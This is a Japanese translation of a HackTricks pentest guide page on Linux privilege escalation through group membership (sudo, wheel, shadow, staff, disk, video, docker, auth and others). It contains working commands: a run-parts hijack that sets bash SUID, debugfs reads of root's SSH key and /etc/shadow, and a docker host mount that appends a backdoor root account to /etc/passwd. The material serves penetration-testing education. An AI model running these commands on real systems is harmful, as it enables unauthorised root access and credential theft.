# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**場合によっては**、**デフォルトで（または一部のソフトウェアが必要とするため）**、**/etc/sudoers** ファイル内に次のような行が見つかることがあります。
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudo または admin グループに属するすべてのユーザーが、sudo としてあらゆる操作を実行できる**ことを意味します。

この場合、**root になるには次を実行するだけです**:
```
sudo su
```
### PE - Method 2

すべてのSUIDバイナリを探し、**Pkexec**バイナリが存在するか確認します。
```bash
find / -perm -4000 2>/dev/null
```
バイナリ **pkexec が SUID binary** であり、**sudo** または **admin** に所属している場合、`pkexec` を使用して sudo としてバイナリを実行できる可能性があります。\
これは、通常これらが **polkit policy** 内のグループだからです。この policy は、基本的にどのグループが `pkexec` を使用できるかを識別します。次のコマンドで確認します：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
そこでは、どのグループに **pkexec** の実行が許可されているかを確認できます。また、一部の Linux ディストリビューションでは、**デフォルトで** **sudo** グループと **admin** グループが表示されます。

**root になるには、次を実行できます**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
**pkexec** を実行しようとして、次の **error** が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないからではなく、GUIなしで接続しているからです**。この問題の workaround は次のページにあります: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なる ssh セッション**が必要です:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**場合によっては**、**デフォルトで** **/etc/sudoers** ファイル内に次の行があります:
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheel グループに属するすべてのユーザーが sudo として何でも実行できる**ことを意味します。

この場合、**root になるには、次を実行するだけで済みます**:
```
sudo su
```
## Shadow Group

**shadow** グループのユーザーは、**/etc/shadow** ファイルを**読み取れます**：
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
それでは、ファイルを読み込み、いくつかの **hashes** を **crack** してみましょう。

hashes を triage する際の、ロック状態に関する重要な補足:
- `!` または `*` を含むエントリは、一般的に password login では対話的に使用できません。
- `!hash` は通常、password が設定された後にロックされたことを意味します。
- `*` は通常、有効な password hash が一度も設定されていないことを意味します。
これは、直接の login がブロックされている場合でも、account の分類に役立ちます。

## Staff グループ

**staff**: root privileges を必要とせずに、ユーザーがシステム（`/usr/local`）へローカルな変更を追加できるようにします（`/usr/local/bin` 内の executables はすべてのユーザーの PATH variable に含まれており、同じ名前の `/bin` および `/usr/bin` 内の executables を「override」する可能性がある点に注意してください）。monitoring/security との関連性が高い "adm" グループと比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)

debian distributions では、`$PATH` variable により、privileged user かどうかに関係なく、`/usr/local/` が最高優先度で実行されることが示されます。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
`/usr/local` にあるプログラムをいくつか hijack できれば、簡単に root を取得できます。

`run-parts` プログラムを hijack するのは、簡単に root を取得する方法です。多くのプログラムが `run-parts` を実行するためです（crontab や SSH login 時など）。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
または、新しい SSH セッションにログインしたとき。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

この privilege は、machine 内部のすべてのデータに access できるため、ほぼ **root access と同等**です。

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
debugfsを使用すると**ファイルを書き込む**こともできる点に注意してください。たとえば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします。
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
ただし、**rootが所有するファイル**（`/etc/shadow` や `/etc/passwd` など）を**書き込もう**とすると、**Permission denied**エラーが発生します。

## Video Group

`w`コマンドを使用すると、**システムにログオンしているユーザー**を確認でき、次のような出力が表示されます。
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** は、ユーザー **yossi がマシン上の端末に物理的にログインしている**ことを意味します。

**video group** には、画面出力を表示する権限があります。基本的には、画面を観察できます。そのためには、**画面上の現在の画像を** raw data として取得し、画面で使用されている解像度を確認する必要があります。画面データは `/dev/fb0` に保存されており、この画面の解像度は `/sys/class/graphics/fb0/virtual_size` で確認できます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**raw image**を**開く**には**GIMP**を使用し、**`screen.raw`**ファイルを選択して、ファイルタイプとして**Raw image data**を選択します：

![Disk Group - Video Group: GIMPを使用してraw imageを開くには、screen.rawファイルを選択し、ファイルタイプとしてRaw image dataを選択します](<../../../images/image (463).png>)

次に、WidthとHeightを画面で使用されている値に変更し、さまざまなImage Typesを確認します（画面が最も適切に表示されるものを選択します）：

![Disk Group - Video Group: 次に、WidthとHeightを画面で使用されている値に変更し、さまざまなImage Typesを確認します（画面が最も適切に表示されるものを選択します）](<../../../images/image (317).png>)

## Root Group

デフォルトでは、**root groupのメンバー**が一部の**service**設定ファイル、一部の**libraries**ファイル、または権限昇格に利用できる**その他の興味深いもの**を**変更**できるようです...

**rootメンバーが変更できるファイルを確認します**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

**ホストマシンの root filesystem をインスタンスの volume に mount できる**ため、インスタンスの起動時にその volume へ `chroot` します。これにより、実質的にそのマシンの root 権限を取得できます。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
最後に、先ほどの提案が気に入らない場合や、何らかの理由（docker api firewall？）でうまく動作しない場合は、こちらで説明されているように、**privileged container を実行してそこから escape する**方法を試すこともできます。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

docker socket に対する write permissions がある場合は、[**docker socket を悪用して privileges を escalate する方法についてのこの記事**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**を読んでください。**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd グループ


{{#ref}}
./
{{#endref}}

## Adm グループ

通常、**`adm`** グループの **members** には、_/var/log/_ 内にある **log** ファイルを **read** する permissions があります。\
したがって、このグループに所属するユーザーを compromise した場合は、必ず **logs を確認**すべきです。

## Backup / Operator / lp / Mail グループ

これらのグループは、root への直接的な vector というよりも、**credential-discovery** の vector となることがよくあります。
- **backup**: configs、keys、DB dumps、tokens を含む archives が露出する可能性があります。
- **operator**: platform-specific な operational access により、sensitive な runtime data が leak する可能性があります。
- **lp**: print queues/spools に document contents が含まれている可能性があります。
- **mail**: mail spools から reset links、OTPs、internal credentials が露出する可能性があります。

このようなグループへの membership は high-value な data exposure finding として扱い、password/token reuse を通じて pivot してください。

## Auth グループ

OpenBSD では、**auth** グループは通常、使用されている場合に _**/etc/skey**_ および _**/var/db/yubikey**_ フォルダへの write が可能です。\
これらの permissions は、次の exploit により root へ **privileges を escalate** するために悪用できます: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
